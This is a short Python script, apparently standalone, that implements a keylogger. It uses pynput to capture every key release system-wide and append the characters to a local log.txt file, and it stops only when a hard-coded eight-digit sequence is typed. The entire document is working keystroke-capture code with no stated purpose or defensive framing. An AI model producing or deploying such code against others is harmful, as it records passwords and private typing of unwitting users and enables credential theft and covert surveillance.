from pynput.keyboard import Listener, Key
from collections import deque

password = ['1','1','0','2','2','0','1','7']
keys = deque(maxlen=8)

def log (text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)

def monitor(key):
    try:
        log(key.char)
        keys.append(key.char)
    except:
        log(" <" + str(key)+"> ")
        keys.append(str(key))
    if ''.join(password) == ''.join(keys):
        return False

with Listener(on_release=monitor) as listener:
    listener.join()